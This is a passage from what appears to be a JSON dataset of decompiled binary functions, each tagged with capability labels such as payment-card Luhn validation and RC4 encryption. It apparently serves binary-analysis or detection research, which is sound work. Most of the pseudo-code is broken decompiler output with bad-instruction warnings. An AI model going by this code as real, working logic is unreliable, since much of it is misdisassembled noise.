out(*puVar14, uVar19);\n                puVar14 = in_stack_00000030 + in_FS_OFFSET + 0x61;\n                uVar7 = *puVar14;\n                uVar32 = puVar11 >> 8;\n                *puVar14 = *puVar14 + uVar32;\n                bVar34 = (POPCOUNT(*puVar14) & 1U) == 0;\n                if (CARRY1(uVar7, uVar32)) {\n                    if (*puVar14 == 0) goto code_r0x00014010ad2e;\n                    goto code_r0x00014010acbc;\n                }\n                *puVar11 = *puVar11 + puVar11;\n                *puVar11 = *puVar11 + puVar11;\ncode_r0x00014010ad26:\n                *puVar11 = *puVar11 + puVar11;\ncode_r0x00014010ad28:\n                *puVar11 = *puVar11 + puVar11;\n                *puVar11 = *puVar11 + puVar11;\ncode_r0x00014010ad2c:\n                *puVar11 = *puVar11 + puVar11;\ncode_r0x00014010ad2e:\n                *puVar11 = *puVar11 + puVar11;\n                *(ppcVar22 + -8) = puVar11;\n                *(ppcVar22 + -0x10) = in_R11;\ncode_r0x00014010ad35:\n                cVar8 = puVar11;\n                *puVar11 = *puVar11 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\ncode_r0x00014010ad43:\n                cVar8 = puVar11;\n                *puVar11 = *puVar11 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\n                *0x14010a920 = *0x14010a920 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\n                *puVar11 = *puVar11 + cVar8;\n                goto code_r0x00014010ad4f;\n            }\n            *0x14010a920 = *0x14010a920 + 'W';\n            puVar28 = puVar14;\ncode_r0x00014010abdc:\n            *puVar11 = *puVar11 & 0xa9;\n            bVar33 = *puVar11 == 0;\n            uVar7 = *puVar11;\n            puVar14 = puVar28;\n            if (bVar33) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\ncode_r0x00014010ac48:\n            bVar34 = (POPCOUNT(uVar7) & 1U) == 0;\n            puVar28 = puVar14;\n            if (!bVar33) {\n                bVar33 = *(puVar14 + 0x67) * 0x4d5f3a3a != *(puVar14 + 0x67) * 0x4d5f3a3a;\n                ppcVar23 = ppcVar22 + 1;\n                ppcVar24 = ppcVar22 + 1;\n                ppcVar25 = ppcVar22 + 1;\n                if (bVar33) {\n                    if (bVar33) {\n                        ppcVar22 = ppcVar22 + 1;\n                        if (bVar33) goto code_r0x00014010ad26;\n                        puVar28 = puVar14 + 1;\n                        out(*puVar14, uVar19);\n                        uVar7 = arg1 >> 8;\n                        bVar33 = uVar7 < *iVar29;\n                        bVar34 = (POPCOUNT(uVar7 - *iVar29) & 1U) == 0;\n                        ppcVar22 = ppcVar24;\n                        ppcVar26 = ppcVar23;\n                        if (bVar33) goto code_r0x00014010ad28;\n                        goto code_r0x00014010acc3;\n                    }\n                    puVar11[0x4f] = puVar11[0x4f] + cVar18;\n                    *ppcVar22 = arg1;\n                }\n                else {\n                    if (!bVar33) {\n    // WARNING: Bad instruction - Truncating control flow here\n                        halt_baddata();\n                    }\n                    ppcVar22 = ppcVar22 + 1;\n                    ppcVar26 = ppcVar25;\n                    if (bVar33) goto code_r0x00014010acc5;\n                }\n                goto code_r0x00014010ad2e;\n            }\ncode_r0x00014010acbc:\n            bVar33 = *(puVar28 + 0x67) * 0x65723a3a != *(puVar28 + 0x67) * 0x65723a3a;\n            ppcVar26 = ppcVar22;\ncode_r0x00014010acc3:\n            ppcVar22 = ppcVar26;\n            ppcVar26 = ppcVar22;\n            if (!bVar33) goto code_r0x00014010ad2e;\ncode_r0x00014010acc5:\n            ppcVar22 = ppcVar26;\n            if (bVar34) goto code_r0x00014010ad2c;\n            puVar14 = in_stack_00000030 + 0x61;\n            uVar7 = *puVar14;\n            uVar32 = puVar11 >> 8;\n            *puVar14 = *puVar14 + uVar32;\n            if (!CARRY1(uVar7, uVar32)) goto code_r0x00014010ad35;\n            if (*puVar14 == 0) goto code_r0x00014010ad43;\n            iVar5 = *(puVar28 + 0x67) * 0x535f3a3a;\n            bVar33 = iVar5 == iVar5;\n            puVar31 = *ppcVar26;\n            if (bVar33) {\ncode_r0x00014010ad52:\n                uVar32 = puVar11;\n                *puVar11 = *puVar11 + uVar32;\n                *puVar11 = *puVar11 + uVar32;\n                uVar7 = *puVar11;\n                *puVar11 = *puVar11 + uVar32;\n                *puVar11 = *puVar11 + uVar32 + CARRY1(uVar7, uVar32);\n                *puVar11 = *puVar11 + uVar32;\n                *puVar11 = *puVar11 + uVar32;\n                *puVar11 = *puVar11 + uVar32;\n                uVar32 = uVar32 + *puVar11;\n                pcVar13 = puVar11 & 0xffffffffffffff00 | uVar32;\n                *pcVar13 = *pcVar13 + uVar32;\n                *pcVar13 = *pcVar13 + uVar32;\n                *pcVar13 = *pcVar13 + uVar32;\n                uVar32 = uVar32 + *pcVar13;\n                puVar11 = puVar11 & 0xffffffffffffff00 | uVar32;\n                *puVar11 = *puVar11 + uVar32;\n                *puVar11 = *puVar11 + uVar32;\n                goto code_r0x00014010ad6e;\n            }\n            if (bVar33) {\n                puVar28 = *(puVar11 + 0x6e);\n                if (*puVar14 == 0) goto code_r0x00014010ace6;\n                goto code_r0x00014010ad52;\n            }\ncode_r0x00014010ad55:\n            cVar8 = puVar11;\n            *puVar11 = *puVar11 + cVar8;\n            *puVar11 = *puVar11 + cVar18;\n            *puVar11 = *puVar11 + cVar8;\n            *puVar11 = *puVar11 + cVar8;\n            *puVar11 = *puVar11 + cVar8;\n        }\n        cVar8 = puVar11;\n        *in_stack_00000030 = *in_stack_00000030 + cVar8;\n        *puVar11 = *puVar11 + cVar8;\n        *puVar11 = *puVar11 + cVar8;\ncode_r0x00014010ad65:\n        cVar8 = puVar11;\n        *puVar11 = *puVar11 + cVar8;\n        *in_stack_00000030 = *in_stack_00000030 + cVar8;\n        *puVar11 = *puVar11 + cVar8;\n        *puVar11 = *puVar11 + cVar8;\n    }\ncode_r0x00014010ad6d:\n    cVar8 = puVar11;\n    *puVar11 = *puVar11 + cVar8;\n    *(puVar11 * 2) = *(puVar11 * 2) + cVar8;\n    *puVar11 = *puVar11 + cVar8;\n    *puVar11 = *puVar11 + cVar8;\n    *puVar11 = *puVar11 + cVar8;\ncode_r0x00014010ad7a:\n    cVar8 = puVar11;\n    *puVar11 = *puVar11 + cVar8;\n    *puVar11 = *puVar11 + cVar8;\n    *puVar11 = *puVar11 + cVar8;\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 20024
    },
    "140083a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00014003add4) overlaps instruction at (ram,0x00014003add3)\n// \n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.140083a10(int64_t **arg1, ulong noname_1, int64_t **arg3)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint16_t *puVar4;\n    ulong uVar5;\n    ulong noname_0;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uint uVar30;\n    uint uVar31;\n    uint uVar32;\n    uint uVar33;\n    uint uVar34;\n    uint uVar35;\n    uint uVar36;\n    uint uVar37;\n    uint uVar38;\n    uint uVar39;\n    uchar *puVar40;\n    uchar *puVar41;\n    uint8_t uVar42;\n    char cVar43;\n    uint8_t uVar44;\n    ushort uVar45;\n    int16_t iVar46;\n    int16_t iVar47;\n    uint16_t uVar48;\n    uint16_t uVar49;\n    uint32_t uVar50;\n    uint32_t uVar51;\n    int64_t iVar52;\n    char *pcVar53;\n    int16_t *piVar54;\n    int64_t *piVar55;\n    uchar *puVar56;\n    int64_t iVar57;\n    ulong uVar58;\n    uint64_t uVar59;\n    int64_t **ppiVar60;\n    uchar (*pauVar61) [16];\n    uint64_t uVar62;\n    int64_t **ppiVar63;\n    char cVar64;\n    ulong *puVar65;\n    int16_t *piVar66;\n    uchar *puVar67;\n    int64_t **ppiVar68;\n    int64_t **unaff_RBX;\n    uchar *puVar69;\n    uint *puVar70;\n    uchar *puVar71;\n    ulong *puVar72;\n    ulong *puVar73;\n    uchar *puVar74;\n    uchar *puVar75;\n    uchar *puVar76;\n    char cVar77;\n    int64_t **ppiVar78;\n    int64_t *unaff_RBP;\n    bool bVar79;\n    int32_t iVar80;\n    int64_t **unaff_RSI;\n    uint8_t *puVar81;\n    int64_t **unaff_RDI;\n    uint8_t uVar82;\n    int64_t **ppiVar83;\n    int64_t **ppiVar84;\n    uint8_t **in_R9;\n    int64_t in_R11;\n    int64_t **unaff_R12;\n    int64_t **unaff_R13;\n    uint32_t *puVar85;\n    int64_t **unaff_R14;\n    int64_t **unaff_R15;\n    ushort in_FS;\n    bool bVar86;\n    uint8_t uVar87;\n    uchar uVar88;\n    bool bVar89;\n    uchar auVar90 [16];\n    uint in_XMM1_Da;\n    uint in_XMM1_Db;\n    uint in_XMM1_Dc;\n    uint in_XMM1_Dd;\n    ulong *puVar91;\n    ushort *puVar92;\n    uint in_XMM3_Da;\n    uint in_XMM3_Db;\n    uint in_XMM3_Dc;\n    uint in_XMM3_Dd;\n    uint in_XMM4_Da;\n    uint in_XMM4_Db;\n    uint in_XMM4_Dc;\n    uint in_XMM4_Dd;\n    uint in_XMM5_Da;\n    uint in_XMM5_Db;\n    uint in_XMM5_Dc;\n    uint in_XMM5_Dd;\n    uint in_XMM6_Da;\n    uint in_XMM6_Db;\n    uint in_XMM6_Dc;\n    uint in_XMM6_Dd;\n    uint in_XMM7_Da;\n    uint in_XMM7_Db;\n    uint in_XMM7_Dc;\n    uint in_XMM7_Dd;\n    uint in_XMM8_Da;\n    uint in_XMM8_Db;\n    uint in_XMM8_Dc;\n    uint in_XMM8_Dd;\n    int64_t **in_stack_00000000;\n    int64_t *piStackX8;\n    uint *puStackX16;\n    ulong *puStackX32;\n    uchar (*in_stack_00000028) [16];\n    int64_t **in_stack_00000030;\n    int16_t iStack0000000000000038;\n    int64_t **in_stack_00000038;\n    uchar uStack0000000000000040;\n    unkbyte5 Stack0000000000000040;\n    uint8_t uStack0000000000000045;\n    char cStack0000000000000046;\n    uint32_t uStack0000000000000044;\n    int64_t **in_stack_00000040;\n    uint8_t in_stack_00000048;\n    uchar in_stack_00000049;\n    unkbyte6 in_stack_0000004a;\n    uint in_stack_00000054;\n    int64_t **in_stack_00000058;\n    int16_t iStack0000000000000060;\n    int64_t **in_stack_00000060;\n    uchar in_stack_00000068;\n    uchar in_stack_00000069;\n    unkbyte6 in_stack_0000006a;\n    uint in_stack_00000070;\n    ulong *in_stack_00000078;\n    int64_t **in_stack_00000080;\n    uchar in_stack_00000088;\n    unkbyte7 in_stack_00000089;\n    int64_t **in_stack_000000c8;\n    int64_t **in_stack_000000e8;\n    uint32_t *in_stack_00000110;\n    ulong in_stack_00000118;\n    ulong in_stack_000001e8;\n    int64_t **in_stack_000001f0;\n    int64_t in_stack_00000208;\n    ulong in_stack_00000220;\n    uchar auStack33927 [60];\n    uint8_t auStack33867 [33747];\n    ulong uStack120;\n    uchar auStack104 [8];\n    uchar auStack96 [16];\n    int64_t iStack80;\n    int64_t *piStack56;\n    ulong uStack48;\n    uchar auStack40 [10];\n    ushort uStack30;\n    ulong *puStack24;\n    ushort *puStack16;\n    \n    puVar72 = auStack104;\n    puVar67 = auStack104;\n    puVar76 = auStack104;\n    puVar75 = auStack104;\n    puVar56 = auStack104;\n    puVar74 = auStack104;\n    puVar91 = *in_R9;\n    puVar92 = in_R9[1];\n    auVar90 = *in_stack_00000028;\n    uVar58 = SUB168(auVar90, 0);\n    puVar65 = 0x14010b1f0;\n    uVar50 = in_stack_00000048 - 100 & 0xff;\n    puStack24 = puVar91;\n    puStack16 = puVar92;\n    uVar59 = *(uVar50 * 4 + 0x14010b1f0);\n    _auStack40 = auVar90;\n    bVar86 = 0xfffffffebfef4e0f < uVar59;\n    ppiVar60 = uVar59 + 0x14010b1f0;\n    bVar89 = ppiVar60 == NULL;\n    uVar44 = ppiVar60;\n    uVar51 = ppiVar60;\n    uVar87 = arg3 >> 8;\n    cVar43 = arg1;\n    puVar73 = auStack104;\n    puVar71 = auStack104;\n    puVar69 = auStack104;\n    puVar40 = auStack104;\n    puVar41 = auStack104;\n    ppiVar63 = in_stack_00000038;\n    unaff_R13 = unaff_R13;\n    ppiVar83 = unaff_R14;\n    // switch table (44 cases) at 0x14010b1f0\n    switch(uVar50) {\n    case 0:\n        (*(*arg3)[4])(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 1:\n    case 2:\n    case 3:\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 10:\n    case 0xb:\n    case 0xc:\n    case 0xd:\n    case 0xe:\n    case 0xf:\n    case 0x11:\n    case 0x12:\n    case 0x14:\n    case 0x15:\n        (*(*arg3)[7])(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 9:\n        (*(*arg3)[6])(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 0x10:\n        (*(*arg3)[3])(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 0x13:\n        (*(*arg3)[5])(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 0x16:\n        (**(uVar59 + 0x14010b208))(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 0x17:\n    case 0x18:\n    case 0x19:\n    case 0x1a:\n    case 0x1b:\n    case 0x1c:\n    case 0x1d:\n    case 0x1e:\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x23:\n    case 0x24:\n    case 0x25:\n    case 0x27:\n    case 0x28:\n    case 0x2a:\n    case 0x2b:\n        (**(uVar59 + 0x14010b220))(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 0x1f:\n        (**(uVar59 + 0x14010b218))(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 0x26:\n        if (bVar89) {\n            *0x640537972 = *0x640537972 + -0x10;\n        }\n        else {\n            ppiVar60 = in_stack_00000030 & 0xffffffff;\n        }\n        goto code_r0x000140083cee;\n    case 0x29:\n        pauVar61 = ppiVar60 & 0xffffffffffffff90;\n        (*pauVar61)[0] = (*pauVar61)[0] + pauVar61;\n        auVar90 = *pauVar61;\n        ppiVar60 = in_stack_00000048 - 100;\n        puVar65 = 0x14010b248;\n        arg3 = in_stack_00000030;\ncode_r0x000140083cee:\n        _auStack40 = auVar90;\n    // WARNING: Could not recover jumptable at 0x000140083d0a. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (22 cases) at 0x14010b248\n        ppiVar63 = (*(*(puVar65 + (ppiVar60 & 0xff) * 4) + puVar65))\n                             (SUB168(auVar90, 0), puVar65, arg3, in_stack_00000030, in_stack_00000038);\n        return ppiVar63;\n    case 0x2c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x30:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x31:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x32:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x33:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x34:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x35:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x36:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x37:\n    case 0x4a:\n    case 0xdf:\n        *0xc951b1e7 = *0xc951b1e7 + -0x10 + bVar86;\n        uVar59 = arg3 << 0x20 | ppiVar60 & 0xffffffff;\n        uVar62 = uVar59 / unaff_RDI & 0xffffffff;\n        iVar80 = unaff_RSI;\n        piVar1 = uVar62 - 0x77;\n        *piVar1 = *piVar1 + 1;\n        uVar62 = uVar59 % unaff_RDI << 0x20 | uVar62;\n        uVar59 = uVar62 / iVar80 & 0xffffffff;\n        piVar1 = uVar59 - 0x77;\n        *piVar1 = *piVar1 + 1;\n        uVar59 = uVar62 % iVar80 << 0x20 | uVar59;\n        uVar62 = uVar59 / iVar80 & 0xffffffff;\n        piVar1 = uVar62 - 0x77;\n        *piVar1 = *piVar1 + 1;\n        uVar62 = uVar59 % iVar80 << 0x20 | uVar62;\n    // WARNING: Could not recover jumptable at 0x00014010b213. Too many branches\n    // WARNING: Treating indirect jump as call\n        ppiVar63 = (*(uVar62 / iVar80 & 0xffffffff))(uVar58, 0x14010b1f0, uVar62 % iVar80 & 0xffffffff);\n        return ppiVar63;\n    case 0x38:\n    case 0x55:\n    case 0xd0:\n    case 0xe0:\n    case 0xee:\n    case 0xfc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x39:\n    case 0x56:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3a:\n    case 0x57:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x40:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x41:\n    case 0x5e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x42:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x43:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x44:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x45:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x46:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x47:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x48:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x49:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4b:\n        *ppiVar60 = *ppiVar60 + uVar44;\n        in_stack_00000040 = in_stack_00000040 & 0xffffffffffffff;\n        in_stack_00000028 = &stack0x00000058;\n        in_stack_00000068 = 0;\n        in_stack_00000000 = &stack0x00000068;\n        in_stack_00000060 = NULL;\n        in_stack_00000058 = in_stack_00000000;\n        if (*(piStack56 + 4) != '\\0') {\n            fcn.1400a9080(in_stack_00000028, 0x20);\n        }\n        in_stack_00000078 = &stack0x00000088;\n        puStackX32 = &stack0x00000078;\n        in_stack_00000080 = NULL;\n        in_stack_00000088 = 0;\n        puStack24 = in_stack_00000078;\n        fcn.1400a9080(puStackX32, 0x20);\n        uStack0000000000000044 = in_stack_00000040 >> 0x20 & 0xffff00ff;\n        uStack48 = uStack48 & 0xffffffff;\n        _auStack40 = CONCAT88(SUB168(_auStack40 >> 0x40, 0), piStack56 + 0x66) & 0xffffffffffffffff;\n        in_stack_00000054 = *(piStack56 + 0xc);\n        puStackX16 = &stack0x00000054;\n        unaff_RBX = NULL;\n        in_stack_00000040 = (uStack0000000000000044 & 0xff00ffff) << 0x20;\n        do {\n            if (*(puStackX16 + stack0xffffffffffffffe0) < 5) {\n    // WARNING: Could not recover jumptable at 0x000140041672. Too many branches\n    // WARNING: Treating indirect jump as call\n                ppiVar63 = (*(*(*(puStackX16 + stack0xffffffffffffffe0) * 4 + 0x14010b31c) + 0x14010b31c))();\n                return ppiVar63;\n            }\n            uVar44 = 1;\ncode_r0x00014004194d:\n            uVar48 = unaff_RDI;\n            auVar90 = _auStack40 >> 0x40;\n            _auStack40 = CONCAT88(stack0xffffffffffffffe0 + 1, auStack40._0_8_);\n        } while ((SUB164(auVar90, 0) + 1 < 4 & uVar44) != 0);\n        if ((0x1 < unaff_RBX & uVar44) == 0) {\n            if (uVar44 == 0) {\ncode_r0x000140041bf5:\n                uVar44 = uVar48 == 0xffff;\n                goto code_r0x000140041bfd;\n            }\njoined_r0x000140042393:\n            if ((0x1 < in_stack_00000080) && (ppiVar63 = fcn.14002f7b0(puStackX32, 0x30, 0),  ppiVar63 != NULL)) {\n                if (ppiVar63 == 0xffffffffffffffff) {\n                    ppiVar63 = in_stack_00000080 + -1;\n                    if (in_stack_00000080 == NULL) {\n                        *in_stack_00000078 = 0;\n                    }\n                    else if (ppiVar63 != NULL) goto code_r0x000140042260;\n                }\n                else {\ncode_r0x000140042260:\n                    ppiVar60 = in_stack_00000080;\n                    if (ppiVar63 <= in_stack_00000080) {\n                        ppiVar60 = ppiVar63;\n                    }\n                    fcn.1400a9130(puStackX32, 0, ppiVar60);\n                }\n            }\n            if ((cStack0000000000000046 != '\\0') && (*in_stack_00000078 != 0x30)) {\n                fcn.1400a76a0(puStackX32, 0, 0, 1);\n            }\n            ppiVar63 = in_stack_00000060;\n            if (in_stack_00000060 != NULL) {\n                uStack48._4_1_ = uStack48 >> 0x20;\n                ppiVar60 = in_stack_00000060 + 1;\n                if (uStack0000000000000045 == '\\0') {\n                    uStack0000000000000040 = uStack48._4_1_;\n                }\n                if (in_stack_00000058 == in_stack_00000000) {\n                    ppiVar83 = 0xf;\n                }\n                else {\n                    ppiVar83 = CONCAT62(in_stack_0000006a, CONCAT11(in_stack_00000069, in_stack_00000068));\n                }\n                if (ppiVar83 < ppiVar60) {\n                    fcn.1400a9390(in_stack_00000028, in_stack_00000060, 0, 0);\n                }\n                *(in_stack_00000058 + ppiVar63) = uStack0000000000000040;\n                (in_stack_00000058 + 1)[ppiVar63] = 0;\n                in_stack_00000060 = ppiVar60;\n                cVar43 = fcn.1400b7670(piStack56[2], piStack56[3], in_stack_00000028);\n                if (cVar43 == '\\0') {\n                    *in_stack_00000110 = *in_stack_00000110 | 4;\n                }\n            }\n            uVar44 = uVar48 == 0xffff;\n            if ((uStack0000000000000045 != '\\0') && (*(piStack56 + 0xb) != uStack48 >> 0x20)) goto code_r0x000140041bfd;\n            fcn.1400a78c0(in_stack_00000118, puStackX32);\n            bVar86 = arg1 != NULL && uVar44;\n            if (arg1 == NULL || !uVar44) goto code_r0x000140041c18;\n        }\n        else {\n            if (cStack0000000000000046 == '\\0') {\n                unaff_R15 = piStack56[7];\n            }\n            else {\n                unaff_R15 = piStack56[9];\n            }\n            unaff_R14 = 0x1;\n            while( true ) {\n                bVar86 = unaff_RDI == -1;\n                unaff_R12 = bVar86;\n                bVar86 = arg1 != NULL && bVar86;\n                unaff_RSI = unaff_R12;\n                if (bVar86) {\n                    if (arg1[2] < arg1[3]) {\n                        iVar46 = *arg1[2];\n                    }\n                    else {\n                        iVar46 = (*(*arg1)[9])(arg1);\n                    }\n                    if (iVar46 == -1) {\n                        arg1 = NULL;\n                        unaff_RSI = bVar86;\n                    }\n                    else {\n                        unaff_RSI = NULL;\n                    }\n                }\ncode_r0x0001400416db:\n                uVar44 = unaff_R12;\n                uVar48 = unaff_RDI;\n                bVar86 = unaff_RBP != NULL && uStack48._2_2_ == -1;\n                if (bVar86) break;\n                if ((uStack48._2_2_ == -1) == unaff_RSI) goto code_r0x000140041f98;\ncode_r0x0001400416fd:\n                if (unaff_RBX <= unaff_R14) goto code_r0x000140041f98;\n                uVar49 = uVar48;\n                if ((arg1 != NULL) && (uVar44 != 0)) {\n                    if (arg1[2] < arg1[3]) {\n                        uVar49 = *arg1[2];\n                    }\n                    else {\n                        uVar49 = (*(*arg1)[9])(arg1);\n                    }\n                    if (uVar49 == 0xffff) {\n                        arg1 = NULL;\n                    }\n                }\n                if (*(unaff_R15 + unaff_R14 * 2) != uVar49) goto code_r0x000140041bfd;\n                if (arg1[2] < arg1[3]) {\n                    arg1[2] = arg1[2] + 2;\n                }\n                else {\n                    (*(*arg1)[10])(arg1);\n                }\n                unaff_R14 = unaff_R14 + 1;\n                unaff_RDI = 0xffffffff;\n            }\n            if (unaff_RBP[2] < unaff_RBP[3]) {\n                iVar46 = *unaff_RBP[2];\n            }\n            else {\n                iVar46 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n            }\n            if (iVar46 == -1) {\n                unaff_RBP = NULL;\n            }\n            if ((iVar46 == -1 && bVar86) != unaff_RSI) goto code_r0x0001400416fd;\ncode_r0x000140041f98:\n            if (unaff_R14 == unaff_RBX) goto joined_r0x000140042393;\ncode_r0x000140041bfd:\n            *in_stack_00000110 = *in_stack_00000110 | 4;\n            bVar86 = arg1 != NULL & uVar44;\n            if (bVar86 == false) goto code_r0x000140041c18;\n        }\n        if (arg1[2] < arg1[3]) {\n            iVar46 = *arg1[2];\n        }\n        else {\n            iVar46 = (*(*arg1)[9])(arg1);\n        }\n        uVar44 = 0;\n        if (iVar46 == -1) {\n            arg1 = NULL;\n            uVar44 = bVar86;\n        }\ncode_r0x000140041c18:\n        bVar86 = iStack0000000000000038 == -1;\n        if ((unaff_RBP != NULL) && (bVar86)) {\n            if (unaff_RBP[2] < unaff_RBP[3]) {\n                iVar46 = *unaff_RBP[2];\n            }\n            else {\n                iVar46 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n            }\n            bVar86 = iVar46 == -1;\n        }\n        if (bVar86 == uVar44) {\n            *in_stack_00000110 = *in_stack_00000110 | 2;\n        }\n        in_stack_000000e8[1] = in_stack_00000030 & 0xffffffffffff0000 | uVar48;\n        *in_stack_000000e8 = arg1;\n        if (in_stack_00000078 != puStack24) {\n            fcn.1400bc6c0();\n        }\n        if (in_stack_00000058 != in_stack_00000000) {\n            fcn.1400bc6c0();\n        }\n        return in_stack_000000e8;\n    case 0x4c:\ncode_r0x0001400418bc:\n        uStack48 = uStack48 & 0xffffffff | uStack48._4_4_ + 1 << 0x20;\n        (in_stack_00000078 + 1)[unaff_RDI] = 0;\n        in_stack_00000080 = unaff_R12;\ncode_r0x0001400418d6:\n        piVar55 = arg1[2];\n        if (arg1[3] <= piVar55) goto code_r0x000140041b2b;\ncode_r0x0001400418e4:\n        arg1[2] = piVar55 + 2;\n        do {\n            unaff_RDI = 0xffffffff;\n            bVar86 = arg1 != NULL;\n            if (bVar86) {\n                if (arg1[2] < arg1[3]) {\n                    iVar46 = *arg1[2];\n                }\n                else {\n                    iVar46 = (*(*arg1)[9])(arg1);\n                }\n                if (iVar46 == -1) {\n                    arg1 = NULL;\n                }\n                bVar86 = iVar46 == -1 && bVar86;\n            }\n            else {\n                bVar86 = true;\n            }\n            bVar89 = unaff_RBP != NULL && uStack48._2_2_ == -1;\n            ppiVar63 = unaff_RDI;\n            if (bVar89) {\n                if (unaff_RBP[2] < unaff_RBP[3]) {\n                    iVar46 = *unaff_RBP[2];\n                }\n                else {\n                    iVar46 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n                }\n                if (iVar46 == -1) {\n                    unaff_RBP = NULL;\n                }\n                if (bVar86 != (iVar46 == -1 && bVar89)) goto code_r0x000140041845;\ncode_r0x000140041be0:\n                uVar48 = ppiVar63;\n                unaff_RDI = ppiVar63;\n                uVar44 = 1;\njoined_r0x000140041bef:\n                if (in_stack_00000080 != NULL) goto code_r0x00014004194d;\n                goto code_r0x000140041bf5;\n            }\n            if (bVar86 == (uStack48._2_2_ == -1)) goto code_r0x000140041be0;\ncode_r0x000140041845:\n            if (arg1 == NULL) {\ncode_r0x000140041853:\n                iVar46 = unaff_RDI;\n                ppiVar63 = unaff_RDI;\n            }\n            else {\n                bVar89 = false;\ncode_r0x00014004184d:\n                if (bVar89) goto code_r0x000140041853;\n                if (arg1[2] < arg1[3]) {\n                    iVar46 = *arg1[2];\n                }\n                else {\n                    iVar46 = (*(*arg1)[9])(arg1);\n                }\n                ppiVar63 = unaff_RDI;\n                if (iVar46 == -1) {\n                    arg1 = NULL;\n                }\n            }\n            unaff_RDI = in_stack_00000080;\n            ppiVar60 = in_stack_00000060;\n            uVar48 = ppiVar63;\n            do {\n                if (iVar46 == *auStack40._0_8_) {\n                    unaff_R12 = in_stack_00000080 + 1;\n                    uVar44 = *(*unaff_R15 + (auStack40._0_8_ - puStack16 >> 1));\n                    ppiVar63 = CONCAT71(in_stack_00000089, in_stack_00000088);\n                    if (in_stack_00000078 == puStack24) {\n                        ppiVar63 = 0xf;\n                    }\n                    if (ppiVar63 < unaff_R12) {\n                        fcn.1400a9390(puStackX32, in_stack_00000080, 0, 0);\n                    }\n                    *(in_stack_00000078 + unaff_RDI) = uVar44;\n                    goto code_r0x0001400418bc;\n                }\n                auStack40._0_8_ = auStack40._0_8_ + 2;\n            } while (auStack40._0_8_ != 